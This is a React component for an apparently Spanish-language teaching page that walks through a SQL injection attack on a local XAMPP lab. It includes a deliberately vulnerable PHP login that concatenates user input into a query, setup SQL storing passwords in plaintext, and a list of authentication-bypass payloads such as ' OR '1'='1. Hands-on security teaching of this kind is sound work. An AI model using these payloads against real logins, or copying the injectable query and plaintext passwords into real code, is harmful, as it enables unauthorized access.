import React, { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Terminal, Database, MonitorSpeaker, Code, AlertCircle } from "lucide-react";

const SQLSimulation = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const formData = new FormData();
    formData.append("username", username);
    formData.append("password", password);
    try {
      const response = await fetch("http://localhost/cyberux-backend/login2.php", {
        method: "POST",
        body: formData,
      });
      const text = await response.text();
      setMessage(text);
    } catch (error) {
      setMessage("Error de conexión con el backend");
    }
  };

  const steps = [
    {
      icon: MonitorSpeaker,
      title: "Instalación de XAMPP en MacBook M1",
      description: "Configuración del entorno de desarrollo local",
      code: "# Descarga e instalación de XAMPP\n# Inicio de Apache y MySQL\nsudo /Applications/XAMPP/xamppfiles/xampp start"
    },
    {
      icon: Database,
      title: "Creación de Base de Datos",
      description: "Establecimiento de la base de datos de prueba",
      code: "CREATE DATABASE caso_seguridad;\nUSE caso_seguridad;"
    },
    {
      icon: Code,
      title: "Creación de Tabla Usuarios",
      description: "Estructura de datos vulnerable",
      code: "CREATE TABLE usuarios (\n  id INT AUTO_INCREMENT PRIMARY KEY,\n  username VARCHAR(50) NOT NULL,\n  password VARCHAR(255) NOT NULL,\n  role VARCHAR(20) DEFAULT 'user'\n);"
    },
    {
      icon: Terminal,
      title: "Inserción de Datos de Prueba",
      description: "Población de la base de datos con usuarios de ejemplo",
      code: "INSERT INTO usuarios (username, password, role) VALUES\n('admin', 'admin123', 'administrator'),\n('usuario1', 'pass123', 'user'),\n('usuario2', 'mypass', 'user');"
    }
  ];

  return (
    <section className="py-20 bg-background">
      <div className="container mx-auto px-4">
        <div className="max-w-6xl mx-auto">
          <h2 className="text-3xl md:text-4xl font-bold text-center mb-6 text-foreground">
            Simulación del Ataque SQL
          </h2>

          {/* Formulario de login vulnerable */}
          <div className="flex flex-col items-center mb-12">
            <div className="w-full max-w-2xl mb-8 p-6 bg-blue-50 border border-blue-200 rounded-lg">
              <h3 className="text-lg font-semibold mb-2 text-blue-900">Instrucciones para la práctica de inyección SQL</h3>
              <ol className="list-decimal list-inside text-blue-900 mb-2">
                <li>Usa el formulario de login vulnerable que aparece abajo.</li>
                <li>Prueba los siguientes ejemplos de inyección SQL:</li>
              </ol>
              <ul className="list-disc list-inside text-blue-900 text-sm">
                <li>
                  <b>Bypass de autenticación:</b><br/>
                  Usuario: <code className="bg-blue-100 px-1 rounded">' OR '1'='1</code><br/>
                  Contraseña: <code className="bg-blue-100 px-1 rounded">cualquier cosa</code>
                </li>
                <li className="mt-2">
                  <b>Obtener todos los usuarios:</b><br/>
                  Usuario: <code className="bg-blue-100 px-1 rounded">admin' OR 1=1 -- </code><br/>
                  Contraseña: <code className="bg-blue-100 px-1 rounded">cualquier cosa</code>
                </li>
                <li className="mt-2">
                  <b>Prueba de error:</b><br/>
                  Usuario: <code className="bg-blue-100 px-1 rounded">admin' OR 'a'='a</code><br/>
                  Contraseña: <code className="bg-blue-100 px-1 rounded">cualquier cosa</code>
                </li>
                <li className="mt-2">
                  <b>Otra variante:</b><br/>
                  Usuario: <code className="bg-blue-100 px-1 rounded">admin' #</code><br/>
                  Contraseña: <code className="bg-blue-100 px-1 rounded">cualquier cosa</code>
                </li>
              </ul>
              <p className="text-xs text-blue-700 mt-4">Observa el resultado tras cada intento y reflexiona sobre cómo la inyección SQL puede comprometer la seguridad de una aplicación web.</p>
            </div>
            <form onSubmit={handleSubmit} className="bg-white p-8 rounded-lg shadow-md w-full max-w-md border">
              <h3 className="text-xl font-semibold mb-4 text-center">Login Vulnerable</h3>
              <input
                type="text"
                placeholder="Username"
                value={username}
                onChange={e => setUsername(e.target.value)}
                className="w-full mb-4 p-2 border rounded"
                required
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={e => setPassword(e.target.value)}
                className="w-full mb-4 p-2 border rounded"
                required
              />
              <button type="submit" className="w-full bg-accent text-white py-2 rounded font-semibold">Login</button>
              {message && <p className="mt-4 text-center text-sm text-foreground">{message}</p>}
            </form>
          </div>

          <p className="text-lg text-muted-foreground text-center mb-12 leading-relaxed max-w-4xl mx-auto">
            Demostración práctica de una vulnerabilidad de inyección SQL utilizando un
            entorno controlado para entender el proceso de explotación.
          </p>

          {/* Setup Steps */}
          <div className="mb-12">
            <h3 className="text-2xl font-semibold mb-8 text-center text-foreground">
              Configuración del Entorno de Prueba
            </h3>

            <div className="grid gap-6">
              {steps.map((step, index) => {
                const IconComponent = step.icon;
                return (
                  <Card key={index} className="hover:shadow-lg transition-all duration-300">
                    <CardHeader>
                      <CardTitle className="flex items-center space-x-3">
                        <div className="w-10 h-10 bg-accent/10 rounded-lg flex items-center justify-center">
                          <IconComponent className="w-5 h-5 text-accent" />
                        </div>
                        <span className="text-lg">{step.title}</span>
                        <Badge variant="outline">{index + 1}</Badge>
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <p className="text-muted-foreground mb-4">{step.description}</p>
                      <div className="bg-muted p-4 rounded-lg">
                        <pre className="text-sm overflow-x-auto text-foreground">
                          <code>{step.code}</code>
                        </pre>
                      </div>
                    </CardContent>
                  </Card>
                );
              })}
            </div>
          </div>

          {/* Attack Demonstration */}
          <div className="mb-12">
            <h3 className="text-2xl font-semibold mb-8 text-center text-foreground">
              Ejecución del Ataque de Inyección SQL
            </h3>

            <div className="grid md:grid-cols-2 gap-8">
              <Card className="border-l-4 border-destructive">
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2 text-destructive">
                    <AlertCircle className="w-5 h-5" />
                    <span>Código Vulnerable</span>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-muted-foreground mb-4">
                    Formulario de login sin validación adecuada:
                  </p>
                  <div className="bg-muted p-4 rounded-lg">
                    <pre className="text-sm overflow-x-auto text-foreground">
                      <code>{`<?php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM usuarios
WHERE username = '$username'
AND password = '$password'";

$result = mysqli_query($conn, $query);`}</code>
                    </pre>
                  </div>
                </CardContent>
              </Card>

              <Card className="border-l-4 border-accent">
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2 text-accent">
                    <Terminal className="w-5 h-5" />
                    <span>Payload del Ataque</span>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-muted-foreground mb-4">
                    Entrada maliciosa en el campo de usuario:
                  </p>
                  <div className="bg-muted p-4 rounded-lg">
                    <pre className="text-sm overflow-x-auto text-foreground">
                      <code>{`Username: ' OR '1'='1
Password: cualquier_cosa

Query resultante:
SELECT * FROM usuarios
WHERE username = '' OR '1'='1'
AND password = 'cualquier_cosa'`}</code>
                    </pre>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>

          {/* Attack Result */}
          <Card className="bg-destructive/5 border-destructive/20">
            <CardHeader>
              <CardTitle className="text-center text-destructive">
                Resultado del Ataque
              </CardTitle>
            </CardHeader>
            <CardContent className="text-center">
              <p className="text-lg text-muted-foreground mb-4">
                La condición <code className="bg-muted px-2 py-1 rounded">'1'='1'</code> es
                siempre verdadera, permitiendo el bypass de la autenticación y acceso no
                autorizado al sistema.
              </p>
              <div className="bg-destructive/10 p-4 rounded-lg">
                <p className="font-semibold text-destructive">
                  ✅ Acceso concedido sin credenciales válidas
                </p>
                <p className="text-sm text-muted-foreground mt-2">
                  El atacante ha obtenido acceso completo al sistema sin conocer credenciales reales
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </section>
  );
};

export default SQLSimulation;